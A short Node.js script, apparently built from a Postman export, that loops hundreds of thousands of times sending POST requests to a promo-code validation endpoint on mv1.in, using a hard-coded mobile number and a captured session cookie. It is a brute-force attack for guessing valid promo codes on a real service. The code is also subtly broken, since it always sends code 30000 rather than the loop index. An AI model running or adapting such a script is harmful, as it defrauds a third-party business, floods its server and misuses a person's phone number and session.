var request = require("request");


for (let index = 30000; index < 1000000; index++) {
// console.log(index)
var options = { method: 'POST',
  url: 'http://mv1.in/ciplaomnigel/validatePromo',
  qs: { mobileno: '8892243828', code: 30000 },
  headers: 
   { 'cache-control': 'no-cache',
     Connection: 'keep-alive',
     'Content-Length': '0',
     Cookie: 'JSESSIONID=5A5B89AEF9380B6F1A8DC1C512BC1B98.17BNS',
     'Accept-Encoding': 'gzip, deflate',
     Host: 'mv1.in',
     'Postman-Token': '5cd381dc-3a0e-4ca7-b285-57767aff709f,7172159e-aa11-4769-88ed-a156efaea064',
     'Cache-Control': 'no-cache',
     Accept: '*/*',
     'User-Agent': 'PostmanRuntime/7.19.0' } };

request(options, function (error, response, body) {
  if (error) throw new Error(error);

  console.log(body);
});
}
// console.log("ancsa",index)


